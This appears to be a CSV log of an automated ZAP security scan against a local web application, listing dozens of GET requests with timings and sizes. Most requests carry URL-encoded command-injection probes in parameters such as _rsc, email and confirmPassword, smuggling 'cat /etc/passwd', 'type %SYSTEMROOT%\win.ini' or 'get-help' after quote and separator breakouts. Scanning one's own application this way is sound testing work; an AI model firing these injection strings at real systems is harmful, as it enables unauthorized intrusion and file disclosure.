ID,Req. Timestamp,Resp. Timestamp,Method,URL,Code,Reason,RTT,Size Resp. Header,Size Resp. Body
1758,Fri Sep 25 14:40:33 IST 2026,Fri Sep 25 14:40:34 IST 2026,GET,http://localhost:3000/faq?_rsc=lquux%27%26type+%25SYSTEMROOT%25%5Cwin.ini%26%27,200,OK,331,303,3842
1759,Fri Sep 25 14:40:34 IST 2026,Fri Sep 25 14:40:34 IST 2026,GET,http://localhost:3000/contact?_rsc=lquux%27%26type+%25SYSTEMROOT%25%5Cwin.ini%26%27,200,OK,257,303,3866
1760,Fri Sep 25 14:40:33 IST 2026,Fri Sep 25 14:40:34 IST 2026,GET,http://localhost:3000/register?confirmPassword=cat+%2Fetc%2Fpasswd&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,567,335,18929
1761,Fri Sep 25 14:40:34 IST 2026,Fri Sep 25 14:40:34 IST 2026,GET,http://localhost:3000/about?_rsc=1yq0k%27%26type+%25SYSTEMROOT%25%5Cwin.ini%26%27,200,OK,150,303,3854
1762,Fri Sep 25 14:40:34 IST 2026,Fri Sep 25 14:40:34 IST 2026,GET,http://localhost:3000/login?_rsc=1yq0k%3Bcat+%2Fetc%2Fpasswd%3B,200,OK,147,303,3854
1763,Fri Sep 25 14:40:34 IST 2026,Fri Sep 25 14:40:34 IST 2026,GET,http://localhost:3000/faq?_rsc=lquux%27%7Ctype+%25SYSTEMROOT%25%5Cwin.ini,200,OK,142,303,3842
1764,Fri Sep 25 14:40:34 IST 2026,Fri Sep 25 14:40:34 IST 2026,GET,http://localhost:3000/contact?_rsc=lquux%27%7Ctype+%25SYSTEMROOT%25%5Cwin.ini,200,OK,136,303,3866
1765,Fri Sep 25 14:40:34 IST 2026,Fri Sep 25 14:40:34 IST 2026,GET,http://localhost:3000/about?_rsc=1yq0k%27%7Ctype+%25SYSTEMROOT%25%5Cwin.ini,200,OK,153,303,3854
1766,Fri Sep 25 14:40:34 IST 2026,Fri Sep 25 14:40:34 IST 2026,GET,http://localhost:3000/login?_rsc=1yq0k%22%26cat+%2Fetc%2Fpasswd%26%22,200,OK,150,303,3854
1767,Fri Sep 25 14:40:34 IST 2026,Fri Sep 25 14:40:34 IST 2026,GET,http://localhost:3000/faq?_rsc=get-help,200,OK,170,303,3842
1768,Fri Sep 25 14:40:34 IST 2026,Fri Sep 25 14:40:34 IST 2026,GET,http://localhost:3000/contact?_rsc=get-help,200,OK,173,303,3866
1769,Fri Sep 25 14:40:34 IST 2026,Fri Sep 25 14:40:34 IST 2026,GET,http://localhost:3000/about?_rsc=get-help,200,OK,153,303,3854
1770,Fri Sep 25 14:40:34 IST 2026,Fri Sep 25 14:40:34 IST 2026,GET,http://localhost:3000/login?_rsc=1yq0k%22%3Bcat+%2Fetc%2Fpasswd%3B%22,200,OK,149,303,3854
1771,Fri Sep 25 14:40:34 IST 2026,Fri Sep 25 14:40:34 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP%26cat+%2Fetc%2Fpasswd%26&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,370,335,18977
1772,Fri Sep 25 14:40:34 IST 2026,Fri Sep 25 14:40:34 IST 2026,GET,http://localhost:3000/faq?_rsc=lquux%3Bget-help,200,OK,130,303,3842
1773,Fri Sep 25 14:40:34 IST 2026,Fri Sep 25 14:40:34 IST 2026,GET,http://localhost:3000/contact?_rsc=lquux%3Bget-help,200,OK,128,303,3866
1774,Fri Sep 25 14:40:34 IST 2026,Fri Sep 25 14:40:34 IST 2026,GET,http://localhost:3000/about?_rsc=1yq0k%3Bget-help,200,OK,119,303,3854
1775,Fri Sep 25 14:40:34 IST 2026,Fri Sep 25 14:40:34 IST 2026,GET,http://localhost:3000/login?_rsc=1yq0k%27%26cat+%2Fetc%2Fpasswd%26%27,200,OK,129,303,3854
1776,Fri Sep 25 14:40:34 IST 2026,Fri Sep 25 14:40:34 IST 2026,GET,http://localhost:3000/faq?_rsc=lquux%22%3Bget-help,200,OK,151,303,3842
1777,Fri Sep 25 14:40:34 IST 2026,Fri Sep 25 14:40:34 IST 2026,GET,http://localhost:3000/contact?_rsc=lquux%22%3Bget-help,200,OK,150,303,3866
1778,Fri Sep 25 14:40:34 IST 2026,Fri Sep 25 14:40:34 IST 2026,GET,http://localhost:3000/about?_rsc=1yq0k%22%3Bget-help,200,OK,173,303,3854
1779,Fri Sep 25 14:40:34 IST 2026,Fri Sep 25 14:40:34 IST 2026,GET,http://localhost:3000/login?_rsc=1yq0k%27%3Bcat+%2Fetc%2Fpasswd%3B%27,200,OK,172,303,3854
1780,Fri Sep 25 14:40:34 IST 2026,Fri Sep 25 14:40:34 IST 2026,GET,http://localhost:3000/faq?_rsc=lquux%27%3Bget-help,200,OK,142,303,3842
1781,Fri Sep 25 14:40:34 IST 2026,Fri Sep 25 14:40:35 IST 2026,GET,http://localhost:3000/contact?_rsc=lquux%27%3Bget-help,200,OK,142,303,3866
1782,Fri Sep 25 14:40:34 IST 2026,Fri Sep 25 14:40:35 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP%3Bcat+%2Fetc%2Fpasswd%3B&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,354,335,18957
1783,Fri Sep 25 14:40:34 IST 2026,Fri Sep 25 14:40:35 IST 2026,GET,http://localhost:3000/about?_rsc=1yq0k%27%3Bget-help,200,OK,127,303,3854
1784,Fri Sep 25 14:40:34 IST 2026,Fri Sep 25 14:40:35 IST 2026,GET,http://localhost:3000/login?_rsc=type+%25SYSTEMROOT%25%5Cwin.ini,200,OK,119,303,3854
1785,Fri Sep 25 14:40:34 IST 2026,Fri Sep 25 14:40:35 IST 2026,GET,http://localhost:3000/faq?_rsc=lquux%3Bget-help+%23,200,OK,125,303,3842
1786,Fri Sep 25 14:40:35 IST 2026,Fri Sep 25 14:40:35 IST 2026,GET,http://localhost:3000/contact?_rsc=lquux%3Bget-help+%23,200,OK,131,303,3866
1787,Fri Sep 25 14:40:35 IST 2026,Fri Sep 25 14:40:35 IST 2026,GET,http://localhost:3000/about?_rsc=1yq0k%3Bget-help+%23,200,OK,176,303,3854
1788,Fri Sep 25 14:40:35 IST 2026,Fri Sep 25 14:40:35 IST 2026,GET,http://localhost:3000/login?_rsc=1yq0k%26type+%25SYSTEMROOT%25%5Cwin.ini,200,OK,183,303,3854
1789,Fri Sep 25 14:40:35 IST 2026,Fri Sep 25 14:40:35 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP%22%26cat+%2Fetc%2Fpasswd%26%22&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,257,335,19013
1790,Fri Sep 25 14:40:35 IST 2026,Fri Sep 25 14:40:35 IST 2026,GET,http://localhost:3000/login?_rsc=1yq0k%7Ctype+%25SYSTEMROOT%25%5Cwin.ini,200,OK,49,303,3854
1791,Fri Sep 25 14:40:35 IST 2026,Fri Sep 25 14:40:35 IST 2026,GET,http://localhost:3000/login?_rsc=1yq0k%22%26type+%25SYSTEMROOT%25%5Cwin.ini%26%22,200,OK,77,303,3854
1792,Fri Sep 25 14:40:35 IST 2026,Fri Sep 25 14:40:35 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP%22%3Bcat+%2Fetc%2Fpasswd%3B%22&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,118,335,18993
1793,Fri Sep 25 14:40:35 IST 2026,Fri Sep 25 14:40:35 IST 2026,GET,http://localhost:3000/login?_rsc=1yq0k%22%7Ctype+%25SYSTEMROOT%25%5Cwin.ini,200,OK,38,303,3854
1794,Fri Sep 25 14:40:35 IST 2026,Fri Sep 25 14:40:35 IST 2026,GET,http://localhost:3000/login?_rsc=1yq0k%27%26type+%25SYSTEMROOT%25%5Cwin.ini%26%27,200,OK,79,303,3854
1795,Fri Sep 25 14:40:35 IST 2026,Fri Sep 25 14:40:35 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP%27%26cat+%2Fetc%2Fpasswd%26%27&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,113,335,18989
1796,Fri Sep 25 14:40:35 IST 2026,Fri Sep 25 14:40:35 IST 2026,GET,http://localhost:3000/login?_rsc=1yq0k%27%7Ctype+%25SYSTEMROOT%25%5Cwin.ini,200,OK,37,303,3854
1797,Fri Sep 25 14:40:35 IST 2026,Fri Sep 25 14:40:35 IST 2026,GET,http://localhost:3000/login?_rsc=get-help,200,OK,66,303,3854
1798,Fri Sep 25 14:40:35 IST 2026,Fri Sep 25 14:40:35 IST 2026,GET,http://localhost:3000/login?_rsc=1yq0k%3Bget-help,200,OK,54,303,3854
1799,Fri Sep 25 14:40:35 IST 2026,Fri Sep 25 14:40:35 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP%27%3Bcat+%2Fetc%2Fpasswd%3B%27&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,157,335,18969
1800,Fri Sep 25 14:40:35 IST 2026,Fri Sep 25 14:40:35 IST 2026,GET,http://localhost:3000/login?_rsc=1yq0k%22%3Bget-help,200,OK,40,303,3854
1801,Fri Sep 25 14:40:35 IST 2026,Fri Sep 25 14:40:35 IST 2026,GET,http://localhost:3000/login?_rsc=1yq0k%27%3Bget-help,200,OK,129,303,3854
1802,Fri Sep 25 14:40:35 IST 2026,Fri Sep 25 14:40:35 IST 2026,GET,http://localhost:3000/register?confirmPassword=type+%25SYSTEMROOT%25%5Cwin.ini&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,173,335,18983
1803,Fri Sep 25 14:40:35 IST 2026,Fri Sep 25 14:40:35 IST 2026,GET,http://localhost:3000/login?_rsc=1yq0k%3Bget-help+%23,200,OK,62,303,3854
1804,Fri Sep 25 14:40:35 IST 2026,Fri Sep 25 14:40:35 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP%26type+%25SYSTEMROOT%25%5Cwin.ini&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,136,335,19013
1805,Fri Sep 25 14:40:35 IST 2026,Fri Sep 25 14:40:36 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP%7Ctype+%25SYSTEMROOT%25%5Cwin.ini&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,162,335,19003
1806,Fri Sep 25 14:40:36 IST 2026,Fri Sep 25 14:40:36 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP%22%26type+%25SYSTEMROOT%25%5Cwin.ini%26%22&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,61,335,19067
1807,Fri Sep 25 14:40:36 IST 2026,Fri Sep 25 14:40:36 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP%22%7Ctype+%25SYSTEMROOT%25%5Cwin.ini&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,67,335,19021
1808,Fri Sep 25 14:40:36 IST 2026,Fri Sep 25 14:40:36 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP%27%26type+%25SYSTEMROOT%25%5Cwin.ini%26%27&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,57,335,19043
1809,Fri Sep 25 14:40:36 IST 2026,Fri Sep 25 14:40:36 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP%27%7Ctype+%25SYSTEMROOT%25%5Cwin.ini&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,54,335,19009
1810,Fri Sep 25 14:40:36 IST 2026,Fri Sep 25 14:40:36 IST 2026,GET,http://localhost:3000/register?confirmPassword=get-help&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,51,335,18891
1811,Fri Sep 25 14:40:36 IST 2026,Fri Sep 25 14:40:36 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP%3Bget-help&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,56,335,18911
1812,Fri Sep 25 14:40:36 IST 2026,Fri Sep 25 14:40:36 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP%22%3Bget-help&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,56,335,18929
1813,Fri Sep 25 14:40:36 IST 2026,Fri Sep 25 14:40:36 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP%27%3Bget-help&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,64,335,18917
1814,Fri Sep 25 14:40:36 IST 2026,Fri Sep 25 14:40:36 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP%3Bget-help+%23&email=zaproxy%40example.com&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,51,335,18925
1815,Fri Sep 25 14:40:36 IST 2026,Fri Sep 25 14:40:36 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=cat+%2Fetc%2Fpasswd&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,51,335,18861
1816,Fri Sep 25 14:40:36 IST 2026,Fri Sep 25 14:40:36 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com%26cat+%2Fetc%2Fpasswd%26&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,57,335,18977
1817,Fri Sep 25 14:40:36 IST 2026,Fri Sep 25 14:40:36 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com%3Bcat+%2Fetc%2Fpasswd%3B&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,50,335,18957
1818,Fri Sep 25 14:40:33 IST 2026,Fri Sep 25 14:40:36 IST 2026,GET,http://localhost:3000/_next/static/chunks/main-app.js?v=1790326850822%3Bcat+%2Fetc%2Fpasswd%3B,200,OK,3207,345,11938274
1819,Fri Sep 25 14:40:36 IST 2026,Fri Sep 25 14:40:36 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com%22%26cat+%2Fetc%2Fpasswd%26%22&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,90,335,19013
1820,Fri Sep 25 14:40:37 IST 2026,Fri Sep 25 14:40:37 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com%22%3Bcat+%2Fetc%2Fpasswd%3B%22&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,64,335,18993
1821,Fri Sep 25 14:40:37 IST 2026,Fri Sep 25 14:40:37 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com%27%26cat+%2Fetc%2Fpasswd%26%27&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,56,335,18989
1822,Fri Sep 25 14:40:37 IST 2026,Fri Sep 25 14:40:37 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=zaproxy%40example.com%27%3Bcat+%2Fetc%2Fpasswd%3B%27&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,57,335,18969
1823,Fri Sep 25 14:40:37 IST 2026,Fri Sep 25 14:40:37 IST 2026,GET,http://localhost:3000/register?confirmPassword=ZAP&email=type+%25SYSTEMROOT%25%5Cwin.ini&membershipType=monthly&name=ZAP&password=ZAP&phone=9999999999&sport=Cricket,200,OK,51,335,18915
